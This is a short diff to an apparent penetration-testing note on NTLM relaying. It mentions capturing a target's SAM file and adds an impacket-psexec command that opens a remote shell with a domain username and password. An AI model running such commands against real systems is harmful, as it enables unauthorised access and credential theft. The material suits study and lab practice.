@@ -21,3 +21,9 @@
 5. it will capture SAM file of the target machine
 
 - Note : using `-i` with `ntlmrelayx.py` will give an interactive shell
+
+#### Gaining shell access
+
+```bash
+impacket-psexec kernel.local/aliakbari:p@ssword1@192.168.127.242
+```
